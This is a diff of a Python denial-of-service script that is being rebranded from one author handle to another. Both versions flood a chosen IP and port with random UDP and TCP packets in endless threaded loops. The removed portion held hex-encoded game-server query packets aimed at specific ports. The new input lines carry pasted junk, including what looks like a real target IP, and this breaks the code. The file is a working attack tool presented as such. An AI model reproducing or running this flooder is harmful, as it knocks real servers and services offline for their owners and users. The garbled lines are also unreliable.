@@ -1,45 +1,33 @@
 #!/usr/bin/env python3
-#Code by AxeL
-import struct
-import time
-import random
+#Code by AxLika
 import socket
-import threading
-import codecs
 import os
+import threading
 import time
+import struct
 import sys
+import random
 
 os.system("clear")
 print("""
-\033[94m
-   _   _     _              ___  ____  
- | \ | | __| | __ _  __ _ / _ \|  _ \ 
- |  \| |/ _` |/ _` |/ _` | | | | |_) |
- | |\  | (_| | (_| | (_| | |_| |  __/ 
- |_| \_|\__,_|\__,_|\__, |\___/|_|    
-                    |___/             
-               Tools By AxeL
+\033[91m
+ __     ____  ______  _     ___ _  __    _    
+ \ \   / /\ \/ /___ \| |   |_ _| |/ /   / \   
+  \ \ / /  \  /  __) | |    | || ' /   / _ \  
+   \ V /   /  \ / __/| |___ | || . \  / ___ \ 
+    \_/   /_/\_\_____|_____|___|_|\_\/_/   \_\
+                                              
+                    AXLIKAVX2
+                    BY AXELBF.
 """)
 
-ip = str(input("\033[95m=====> + IP Target    : "))
-port = int(input("=====> + PORT Target  : "))
-times = int(input("=====> $ Send PACKETS : "))
-threads = int(input("=====> $ Send THREADS : "))
-choice = str(input("=====> × Ready? (y/n) : "))
-fake_ip = '182.21.20.32'
-#Starting Attacking
-Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
-                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
-                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
-                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
-                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
-                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
-                       ]
-def run():
+ip = str(input("\033[92m =====> \033[93m[•] Target IP : "))139.177.189.98
+port = int(input("\033[92m =====> \033[93m[·] Port : "))5572
+times = int(input("\033[92m =====> \033[93m[&] Times : "))9999999999
+threads = int(input("\033[93m =====> \033[93m[*] Threads : "))okey sorry na
+choice = str(input("\033[93m =====> \033[93m[$] Yakin? (y/n) : "))99999999
+
+def lika():
 	data = random._urandom(17)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
@@ -48,12 +36,12 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" AXELOREZ MENGIRIM")
+			print(i +"\033[94m DDOS BY AxeLOREZ !!!")
 		except:
-			print("[!] Error!!!")
+			print("\033[94m [!] DDOS BY AxeLOREZ!!!")
 
-def run2():
-	data = random._urandom(16)
+def lika2():
+	data = random._urandom(666)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -62,12 +50,13 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" AXELOREZ MENGIRIM")
+			print(i +"\033[94m DDOS BY AxeLOREZ !!!")
 		except:
 			s.close()
-			print("[*] Error")
-def run3():
-	data = random._urandom(999)
+			print("\033[94m [*] DDOS BY AxeLOREZ!!!")
+
+def lika3():
+	data = random._urandom(17)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -75,68 +64,19 @@ def run3():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" AXELOREZ MENGIRIM")
+			print(i +"\033[94m DDOS BY AxeLOREZ !!!")
 		except:
-			print("[!] Error!!!")
-
-def run2():
-	data = random._urandom(999)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" AxeLOREZ MENGIRIM")
-		except:
-			s.close()
-			print("[*] Error")
+			print("\033[94m [!] DDOS BY AxeLOREZ!!!")
 
 			
-#Urandom Dan Pacotes
-class MyThread(threading.Thread):
-     def run(self):
-         while True:
-                sock = socket.socket(
-                    socket.AF_INET, socket.SOCK_DGRAM)
-                
-                msg = Pacotes[random.randrange(0,5)]
-                     
-                sock.sendto(msg, (ip, int(port)))
-                
-                
-                if(int(port) == 7777):
-                    sock.sendto(Pacotes[5], (ip, int(port)))
-                elif(int(port) == 7796):
-                    sock.sendto(Pacotes[4], (ip, int(port)))
-                elif(int(port) == 7771):
-                    sock.sendto(Pacotes[6], (ip, int(port)))
-                elif(int(port) == 7784):
-                    sock.sendto(Pacotes[7], (ip, int(port)))
-                    
-                
-
-if __name__ == '__main__':
-    try:
-     for x in range(200):                                    
-            mythread = MyThread()  
-            mythread.start()                                  
-            time.sleep(.1)    
-    except(KeyboardInterrupt):
-         os.system('cls' if os.name == 'nt' else 'clear')
-         
 for y in range(threads):
+
 	if choice == 'y':
-		th = threading.Thread(target = run)
+
+		th = threading.Thread(target = lika)
 		th.start()
-		th = threading.Thread(target = run2)
+		th = threading.Thread(target = lika2)
 		th.start()
-		th = threading.Thread(target = run3)
-		th.start()
-		th = threading.Thread(target = run4)
-		th.start()
-else:
-		th = threading.Thread(target = run5)
+	else:
+		th = threading.Thread(target = lika3)
 		th.start()
